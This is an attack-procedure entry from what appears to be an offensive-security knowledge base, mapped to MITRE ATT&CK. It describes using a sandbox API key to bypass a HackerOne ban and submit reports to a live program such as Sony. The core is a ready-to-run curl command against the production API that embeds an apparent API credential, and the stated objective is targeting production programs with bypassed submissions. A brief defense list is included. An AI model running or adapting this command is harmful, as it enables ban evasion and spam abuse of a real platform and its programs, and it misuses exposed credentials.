---
tags:
  - auth-bypass
  - api
  - real-program
  - hackerone
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-hackerone-report-submission]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:48.307Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 845f7aad-a74d-4d22-9a22-6a89b77361c7
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Submit-to-Real-Program-for-Confirmation

## Summary

This procedure extends the API bypass to submit a test report to a production program (e.g., Sony), confirming the vulnerability affects real targets.

## Description

Modify the team_handle in the API payload to a live program's handle and resubmit using the sandbox API key. This demonstrates full impact, as banned users can abuse any program with spam reports. The endpoint remains /v1/hackers/reports, with JSON attributes adjusted accordingly.

## Requirements

1. Valid team_handle for real program (e.g., "sony")
2. Sandbox API key
3. curl tool

## Defense

Defensive measures and detection strategies:

- Enforce bans on all API scopes
- Monitor cross-program submissions
- Implement program-specific rate limits

## Objectives

1. Target production programs with bypassed submissions
2. Highlight abuse potential
3. Expected outcome: Report accepted in real program

## Instructions

### Step 1: Update Payload for Real Program

**Context**: Change team_handle to the target program's identifier.

**Command** ([[commands/curl-hackerone-report-submission]]):
```bash
curl "https://api.hackerone.com/v1/hackers/reports" -X POST -u "testhackerone-creative:pYnONekvxUTvHbKF7Jp64qh9STIhhdXvKmefWOeR8YU=" -H 'Content-Type: application/json' -H 'Accept: application/json' -d @- <<EOD { "data": { "type": "report", "attributes": { "team_handle": "sony", "title": "string", "vulnerability_information": "test tst tst", "impact": "tst tst", "severity_rating": "none", "weakness_id": 1 } } } EOD
```

> Expected output: 201 Created, confirming submission to real program.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-hackerone-report-submission]]

## Tools Used

- [[tools/curl]]

## Tags

- auth-bypass
- api
- real-program
- hackerone
